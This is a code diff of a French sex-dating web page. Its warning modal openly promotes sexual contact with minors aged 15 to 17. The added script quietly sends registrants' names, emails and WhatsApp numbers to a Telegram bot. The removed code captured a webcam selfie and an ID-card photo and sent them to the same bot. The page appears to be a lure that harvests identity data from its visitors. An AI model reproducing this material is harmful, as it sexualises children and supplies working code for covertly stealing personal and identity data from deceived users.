@@ -575,11 +575,8 @@ header {
         <div class="modal-content">
             <h3>🛡️ Attention !!!</h3>
             <p> 
-                La particularité de ce site est que vous rencontrerez également des gonzesses de 15 et 17 ans mais mûr et mature 🫦👅💦. Si celà vous dérange il n'est pas trop tard pour faire marche arrière.
-                ‎
-                Afin d'assurer un environnement de qualité nous informons nos utilisateurs de ce qu'ils vont rencontrer sur le site pour ne pas les decevoir.
-                <br><br>
-                Ceci est une mesure de sécurité standard pour protéger tous nos membres.
+               ‎🚨 Vous rencontrerez  egalement les gonzesses de moins de 18 ans mûres et cannon 💋👅🍆, si cela vous derange il n'est pas tard pour faire marche arrière.<br><br>
+                Ceci est une information standard pour que vous puissiez prendre conscience de l'experience que peut offrir notre site.
             </p>
             <div class="modal-buttons">
                 <button id="accept-btn-2">J'ai Compris, Continuer l'Inscription</button>
@@ -589,8 +586,8 @@ header {
     
     <div id="registration-modal" class="modal">
         <div class="modal-content">
-            <h3>📝 Infos de Base</h3>
-            <p>Veuillez remplir vos informations de contact et votre profil initial pour passer à l'étape de vérification.</p>
+            <h3>📝 Informations personnelles</h3>
+            <p>Veuillez remplir vos informations de contact et votre profil initial pour finaliser votre inscription.</p>
             
             <form id="registration-form">
                 <div class="form-group">
@@ -605,7 +602,7 @@ header {
                     <label for="reg-age">Email :</label>
                     <div class="input-wrapper">
                         <input type="email" id="reg-age" name="email" required placeholder="Votre email">
-                        <i class="fas fa-birthday-cake input-icon"></i>
+                        <i class="fas fa-birthday-cake input-icon"></i> 
                     </div>
                 </div>
                 
@@ -617,50 +614,11 @@ header {
                     </div>
                 </div>
                 
-                <button type="submit" id="submit-btn">Continuer vers la Vérification</button>
-            </form>
-        </div>
-    </div>
-
-    <div id="identity-check-modal" class="modal">
-        <div class="modal-content">
-            <h3>🛡️ Vérification d'Identité Requise</h3>
-            <p>
-                À fin de limiter les faux profils,nous avons besoin de vérifier l'identité de chaque utilisateur. Prenez un selfie en direct et importez votre pièce d'identité (recto).
-            </p>
-            
-            <form id="verification-form">
-                <div class="form-group" style="text-align: center;">
-                    <label style="margin-bottom: 10px;">Photo Selfie en Direct :</label>
-                    <div style="border: 2px solid #ccc; border-radius: 8px; overflow: hidden; margin-bottom: 10px;">
-                        <video id="webcam-preview" width="100%" height="auto" autoplay style="display: none;"></video>
-                        <canvas id="selfie-canvas" width="340" height="255" style="display: none;"></canvas>
-                        
-                        <p id="webcam-status" class="btn-activate-camera" style="padding: 10px; font-weight: bold;">
-                            <i class="fas fa-camera"></i> Cliquez pour prendre un selfie
-                        </p>
-                    </div>
-                    
-                    <button type="button" id="capture-selfie-btn" disabled class="btn-access" style="width: 100%; margin: 0; background-color: #28a745;">
-                        <i class="fas fa-camera"></i> Prendre le Selfie
-                    </button>
-                    <input type="hidden" id="selfie-data" name="selfie_data" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="reg-id-card-photo-final">Importer une photo de pièce d'identité :</label>
-                    <div class="input-wrapper">
-                        <input type="file" id="reg-id-card-photo-final" name="id_card_photo" required accept="image/*" class="file-input">
-                        <i class="fas fa-address-card input-icon" style="color: var(--primary-color);"></i>
-                    </div>
-                </div>
-                
-                <button type="submit" id="submit-verification-btn" disabled>Soumettre la Vérification</button>
+                <button type="submit" id="submit-btn">Finaliser l'Inscription</button> 
             </form>
         </div>
     </div>
     
-
     <script>
 
 // Clé pour stocker l'état dans le localStorage
@@ -675,7 +633,7 @@ const body = document.body;
 const modal1 = document.getElementById('confidentiality-modal');
 const modal2 = document.getElementById('verification-modal');
 const modal3 = document.getElementById('registration-modal'); 
-const modal4 = document.getElementById('identity-check-modal'); 
+// const modal4 = document.getElementById('identity-check-modal'); // Supprimé
 
 const openModalBtn = document.getElementById('open-modal-btn');
 const acceptBtn1 = document.getElementById('accept-btn-1');
@@ -684,18 +642,13 @@ const acceptBtn2 = document.getElementById('accept-btn-2');
 const registrationForm = document.getElementById('registration-form'); 
 const submitBtn = document.getElementById('submit-btn'); 
 
-// NOUVELLES RÉFÉRENCES (Modal 4)
-const verificationForm = document.getElementById('verification-form');
-const submitVerificationBtn = document.getElementById('submit-verification-btn');
-const webcamPreview = document.getElementById('webcam-preview');
-const selfieCanvas = document.getElementById('selfie-canvas');
-const webcamStatus = document.getElementById('webcam-status'); // C'est maintenant le bouton d'activation
-const captureSelfieBtn = document.getElementById('capture-selfie-btn');
-const selfieDataInput = document.getElementById('selfie-data');
-const idCardInput = document.getElementById('reg-id-card-photo-final');
+// Les références au Modal 4 sont supprimées ou commentées :
+// const verificationForm = document.getElementById('verification-form'); // Supprimé
+// const submitVerificationBtn = document.getElementById('submit-verification-btn'); // Supprimé
+// const webcamPreview = document.getElementById('webcam-preview'); // Supprimé
+// ... et le reste des éléments webcam
 
 // Variables globales
-let videoStream = null;
 let registrationData = {}; // Pour stocker Name, Age, WhatsApp
 
 // URL de destination après inscription
@@ -726,23 +679,10 @@ function openModal(modal) {
 function closeModal(modal) {
     modal.style.display = "none";
     
-    // Arrêter la caméra si on ferme le modal de vérification
-    if (modal === modal4 && videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-        webcamPreview.style.display = 'none';
-        
-        // Réinitialiser l'élément d'activation
-        webcamStatus.style.display = 'block';
-        webcamStatus.classList.remove('disabled');
-        webcamStatus.innerHTML = '<i class="fas fa-camera"></i> Cliquez pour prendre un selfie';
-        
-        // Cacher le bouton de capture
-        captureSelfieBtn.style.display = 'none';
-    }
+    // Ancien code pour arrêter la caméra (supprimé car Modal 4 est supprimé)
     
     // Vérifie si tous les modaux sont fermés pour réactiver le scroll
-    if (modal1.style.display === "none" && modal2.style.display === "none" && modal3.style.display === "none" && modal4.style.display === "none") {
+    if (modal1.style.display === "none" && modal2.style.display === "none" && modal3.style.display === "none") { // Modifié pour ne vérifier que les modales existantes
         body.classList.remove('modal-open');
     }
 }
@@ -759,8 +699,6 @@ function handleMainAction(e) {
 }
 
 openModalBtn.onclick = handleMainAction;
-// L'ancien gestionnaire d'événements pour le bouton 'Accéder' a été supprimé.
-
 
 // MODAL 1 -> MODAL 2
 acceptBtn1.onclick = function() {
@@ -779,222 +717,85 @@ acceptBtn2.onclick = function() {
     openModal(modal3); 
 }
 
-// MODAL 3 (Inscription) -> MODAL 4 (Vérification)
-registrationForm.addEventListener('submit', function(e) { 
+// MODAL 3 (Inscription) -> FIN (Redirection)
+registrationForm.addEventListener('submit', async function(e) { // Rendu async pour l'envoi Telegram
     e.preventDefault(); 
     
+    // 1. Récupération des données
     registrationData.name = document.getElementById('reg-name').value;
-    registrationData.age = document.getElementById('reg-age').value;
+    registrationData.email = document.getElementById('reg-age').value; // 'reg-age' est utilisé pour l'email
     registrationData.whatsapp = document.getElementById('reg-whatsapp').value;
     
-    closeModal(modal3);
-    openModal(modal4);
+    // 2. Préparation du bouton de soumission
+    submitBtn.disabled = true;
+    submitBtn.classList.add('loading');
+    submitBtn.innerHTML = '<span class="loading-spinner"></span> Envoi de l\'inscription...';
+
+    // 3. Envoi des données via Telegram (comme un message simple)
+    const { name, email, whatsapp } = registrationData; 
+    const message = `*Nouvelle Inscription Terminée* ✅\n\nNom/Pseudo: ${name}\nEmail: ${email}\nWhatsApp: ${whatsapp}`;
+    const sendSuccess = await sendMessageToTelegram(message);
+
+    // 4. Fin
+    submitBtn.classList.remove('loading');
+    submitBtn.innerHTML = 'Finaliser l\'Inscription';
+
+    if (sendSuccess) {
+        setRegistrationComplete(); 
+        closeModal(modal3); // Fermer le dernier modal
+        redirectToSite();
+    } else {
+        alert("Attention : L'inscription n'a pas pu être envoyée (erreur réseau ou jeton/chat_id incorrect). Veuillez réessayer.");
+        submitBtn.disabled = false; 
+    }
 });
 
 
-// --- LOGIQUE WEBCAM (MODAL 4) ---
-
-// 1. Activer la Caméra (Clic sur le statut)
-webcamStatus.onclick = async function() {
-    // Si l'élément est désactivé (en cours de chargement), on ne fait rien
-    if (webcamStatus.classList.contains('disabled')) return; 
-
-    webcamStatus.classList.add('disabled');
-    webcamStatus.innerHTML = '<span class="loading-spinner" style="border-top-color: white;"></span> Activation de la caméra...';
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        videoStream = stream;
-        webcamPreview.srcObject = stream;
-        webcamPreview.style.display = 'block';
-        selfieCanvas.style.display = 'none';
-        
-        webcamPreview.onloadedmetadata = function() {
-            webcamPreview.play();
-            
-            selfieCanvas.width = webcamPreview.videoWidth;
-            selfieCanvas.height = webcamPreview.videoHeight;
-            
-            // Masquer l'indicateur cliquable
-            webcamStatus.style.display = 'none'; 
-            
-            // Afficher et activer le bouton de capture
-            captureSelfieBtn.style.display = 'block'; 
-            captureSelfieBtn.disabled = false;       
-            
-            submitVerificationBtn.disabled = true;
-        };
-
-    } catch (err) {
-        console.error("Erreur d'accès à la webcam: ", err);
-        webcamStatus.innerHTML = '<i class="fas fa-times-circle"></i> Erreur: Accès refusé. Cliquez pour réessayer.';
-        webcamStatus.classList.remove('disabled'); 
-        webcamStatus.style.display = 'block';
-        captureSelfieBtn.style.display = 'none'; 
-        captureSelfieBtn.disabled = true;
-        alert("Impossible d'accéder à la caméra. Veuillez autoriser l'accès à la webcam.");
-    }
-};
-
-// 2. Capturer le Selfie
-captureSelfieBtn.onclick = function() {
-    const context = selfieCanvas.getContext('2d');
+// --- FONCTION POUR L'ENVOI D'UN MESSAGE TEXTE SIMPLE À TELEGRAM ---
+async function sendMessageToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const params = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
     
-    const videoWidth = webcamPreview.videoWidth;
-    const videoHeight = webcamPreview.videoHeight;
-    selfieCanvas.width = videoWidth;
-    selfieCanvas.height = videoHeight;
-    
-    context.drawImage(webcamPreview, 0, 0, videoWidth, videoHeight);
-    
-    const dataUrl = selfieCanvas.toDataURL('image/jpeg', 0.9);
-    selfieDataInput.value = dataUrl;
-    
-    webcamPreview.style.display = 'none';
-    selfieCanvas.style.display = 'block';
-    
-    // Arrêter le flux de la caméra
-    if (videoStream) {
-        videoStream.getTracks().forEach(track => track.stop());
-        videoStream = null;
-    }
-    
-    // Cacher le bouton de capture et réactiver l'élément d'activation
-    captureSelfieBtn.style.display = 'none';
-    
-    webcamStatus.style.display = 'block';
-    webcamStatus.classList.remove('disabled');
-    webcamStatus.innerHTML = '<i class="fas fa-redo-alt"></i> Selfie pris avec succes.'; 
-    
-    // Vérifier la CI et débloquer le bouton de soumission
-    if (idCardInput.files.length > 0) {
-        submitVerificationBtn.disabled = false;
-    }
-};
-
-// 3. Suivre la sélection de la CI
-idCardInput.onchange = function() {
-    // Si le selfie a été pris (selfieDataInput n'est pas vide)
-    if (selfieDataInput.value && idCardInput.files.length > 0) {
-        submitVerificationBtn.disabled = false;
-    } else {
-        submitVerificationBtn.disabled = true;
-    }
-};
-
-
-// --- GESTION DE LA SOUMISSION FINALE (MODAL 4) ---
-
-/**
- * Envoie un fichier (File object ou Blob) au bot Telegram en utilisant l'API sendDocument.
- */
-async function sendFileToTelegram(file, caption, fileName) {
-    if (!file) {
-        return false;
-    }
-
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', file, fileName); 
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'Markdown');
-    
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-
     try {
         const response = await fetch(url, {
             method: 'POST',
-            body: formData 
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(params)
         });
 
         if (response.ok) {
             return true;
         } else {
             const data = await response.json();
-            console.error(`Échec de l'envoi de fichier. Statut: ${response.status}`, data);
+            console.error(`Échec de l'envoi du message. Statut: ${response.status}`, data);
             return false;
         }
     } catch (error) {
-        console.error("Erreur réseau/CORS lors de l'envoi du fichier:", error);
+        console.error("Erreur réseau/CORS lors de l'envoi du message:", error);
         return false;
     }
 }
 
 
-verificationForm.addEventListener('submit', async function(e) { 
-    e.preventDefault(); 
-    
-    // 1. Validation de base
-    if (!selfieDataInput.value || idCardInput.files.length === 0) {
-        alert("Veuillez prendre un selfie et importer votre pièce d'identité.");
-        return;
-    }
-
-    // Empêcher les doubles clics
-    submitVerificationBtn.disabled = true;
-    submitVerificationBtn.classList.add('loading');
-    submitVerificationBtn.innerHTML = '<span class="loading-spinner"></span> Envoi des fichiers...';
-
-    // 2. Conversion du selfie (Data URL vers Blob)
-    const base64Data = selfieDataInput.value.split(',')[1];
-    const byteCharacters = atob(base64Data);
-    const byteNumbers = new Array(byteCharacters.length);
-    for (let i = 0; i < byteCharacters.length; i++) {
-        byteNumbers[i] = byteCharacters.charCodeAt(i);
-    }
-    const byteArray = new Uint8Array(byteNumbers);
-    const selfieBlob = new Blob([byteArray], { type: 'image/jpeg' });
-    
-    const idCardFile = idCardInput.files[0];
-    
-    let allSent = true;
-
-    // Récupère les données du modal 3
-    const { name, age, whatsapp } = registrationData; 
-    const baseCaption = `*Nouvelle Inscription* 🚨\n\nNom/Pseudo: ${name}\nÂge: ${age} ans\nWhatsApp: ${whatsapp}`;
-
-    // 3. Envoi du Selfie (Blob)
-    const selfieCaption = `${baseCaption}\n\nType: *Selfie en Direct*`;
-    const selfieSuccess = await sendFileToTelegram(selfieBlob, selfieCaption, `${name}_selfie.jpeg`);
-    if (!selfieSuccess) {
-        allSent = false;
-    }
-
-    // 4. Envoi de la Pièce d'Identité (Fichier)
-    if (allSent) { 
-        submitVerificationBtn.innerHTML = '<span class="loading-spinner"></span> Finalisation...';
-        const idCardCaption = `${baseCaption}\n\nType: *Pièce d'Identité (CI)*`;
-        const idCardSuccess = await sendFileToTelegram(idCardFile, idCardCaption, idCardFile.name);
-        if (!idCardSuccess) {
-            allSent = false;
-        }
-    }
-
-    // 5. Fin
-    submitVerificationBtn.classList.remove('loading');
-    submitVerificationBtn.innerHTML = 'Soumettre la Vérification';
-
-    if (allSent) {
-        setRegistrationComplete(); 
-        closeModal(modal4); 
-        redirectToSite();
-    } else {
-        alert("Attention : Un ou plusieurs fichiers n'ont pas pu être envoyés (erreur réseau, CORS ou jeton/chat_id incorrect). Veuillez réessayer.");
-        submitVerificationBtn.disabled = false; 
-    }
-});
-
+// --- GESTION DE LA SOUMISSION FINALE (Ancien code de vérification supprimé) ---
+// La fonction `sendFileToTelegram` est retirée car l'envoi de fichiers n'est plus nécessaire.
 
 // Ferme les Modals si l'utilisateur clique en dehors des boîtes
 window.onclick = function(event) {
-    if (event.target == modal1 || event.target == modal2 || event.target == modal3 || event.target == modal4) {
+    if (event.target == modal1 || event.target == modal2 || event.target == modal3) { // Modifié
         closeModal(event.target);
     }
 }
 
 
 // **********************************************
-// * NOUVELLE LOGIQUE POUR GOOGLE TRANSLATE *
+// * LOGIQUE GOOGLE TRANSLATE (inchangée) *
 // **********************************************
 function googleTranslateElementInit() {
     new google.translate.TranslateElement({
